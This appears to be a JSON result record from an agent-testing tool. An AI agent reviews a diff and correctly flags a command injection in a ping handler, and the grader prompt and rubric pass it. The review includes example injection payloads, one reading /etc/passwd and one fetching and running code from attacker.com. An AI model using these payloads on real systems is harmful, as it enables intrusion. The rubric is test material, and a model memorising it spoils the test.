@@ -1,0 +1,52 @@
+{
+  "caseId": "cmdi-shell-true",
+  "rep": 6,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-cmdi.patch"
+  ],
+  "output": "**Command injection (CWE-78)** in `src/net/ping.py:9`.\n\nThe diff changes `ping_host()` from the safe list-argument form:\n```python\nsubprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True)\n```\nto a shell-concatenated string with `shell=True`:\n```python\nsubprocess.run(\"ping -c 1 \" + host, shell=True, capture_output=True, text=True)\n```\n\n`host` comes straight from `request.GET.get(\"host\", \"\")` with no validation or escaping. With `shell=True`, the string is handed to `/bin/sh`, so shell metacharacters (`;`, `&&`, `|`, `$()`, backticks, etc.) are interpreted. Example exploit: `GET /ping?host=8.8.8.8;cat+/etc/passwd` or `GET /ping?host=$(curl+attacker.com/x|sh)` — arbitrary commands run with the web server's privileges.\n\n**Fix:** revert to the list form without `shell=True` (as it was before), and/or validate `host` against a strict hostname/IP pattern before use.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-18T22:39:33.996Z",
+  "durationMs": 30564,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the OS command injection vulnerability (CWE-78), explaining that the diff changed subprocess.run from a safe list-argument form to a shell=True string concatenation using the unvalidated request.GET \"host\" parameter, and provided concrete exploit examples demonstrating shell metacharacter injection, which matches the rubric exactly.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the OS command injection vulnerability (CWE-78), explaining that the diff changed subprocess.run from a safe list-argument form to a shell=True string concatenation using the unvalidated request.GET \"host\" parameter, and provided concrete exploit examples demonstrating shell metacharacter injection, which matches the rubric exactly."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the exact vulnerability specified in the rubric — command injection (CWE-78) caused by passing the user-controlled 'host' parameter from request.GET into subprocess.run via string concatenation with shell=True, replacing a safe list-argument invocation. It cited the correct line, explained the exploit mechanism (shell metacharacter interpretation), gave concrete exploit examples, and proposed an appropriate fix, unambiguously satisfying the rubric.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the exact vulnerability specified in the rubric — command injection (CWE-78) caused by passing the user-controlled 'host' parameter from request.GET into subprocess.run via string concatenation with shell=True, replacing a safe list-argument invocation. It cited the correct line, explained the exploit mechanism (shell metacharacter interpretation), gave concrete exploit examples, and proposed an appropriate fix, unambiguously satisfying the rubric."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe review must correctly identify an OS command injection vulnerability in the diff: the user-controlled 'host' value from request.GET is passed to subprocess.run with shell=True via string concatenation, allowing shell command injection. PASS only if command injection (or an equivalent unambiguous description) is identified as a genuine security vulnerability; FAIL if it misses it or makes only stylistic comments.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n**Command injection (CWE-78)** in `src/net/ping.py:9`.\n\nThe diff changes `ping_host()` from the safe list-argument form:\n```python\nsubprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True)\n```\nto a shell-concatenated string with `shell=True`:\n```python\nsubprocess.run(\"ping -c 1 \" + host, shell=True, capture_output=True, text=True)\n```\n\n`host` comes straight from `request.GET.get(\"host\", \"\")` with no validation or escaping. With `shell=True`, the string is handed to `/bin/sh`, so shell metacharacters (`;`, `&&`, `|`, `$()`, backticks, etc.) are interpreted. Example exploit: `GET /ping?host=8.8.8.8;cat+/etc/passwd` or `GET /ping?host=$(curl+attacker.com/x|sh)` — arbitrary commands run with the web server's privileges.\n\n**Fix:** revert to the list form without `shell=True` (as it was before), and/or validate `host` against a strict hostname/IP pattern before use.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "transcript": {
+    "command": "claude",
+    "args": [
+      "-p",
+      "Review this diff for security issues and report your findings. Read the file 'diff-cmdi.patch' in your current working directory, then review it.",
+      "--permission-mode",
+      "bypassPermissions",
+      "--model",
+      "claude-sonnet-5"
+    ],
+    "exitCode": 0,
+    "timedOut": false,
+    "stderr": "Warning: no stdin data received in 3s, proceeding without it. If piping from a slow command, redirect stdin explicitly: < /dev/null to skip, or wait longer."
+  }
+}
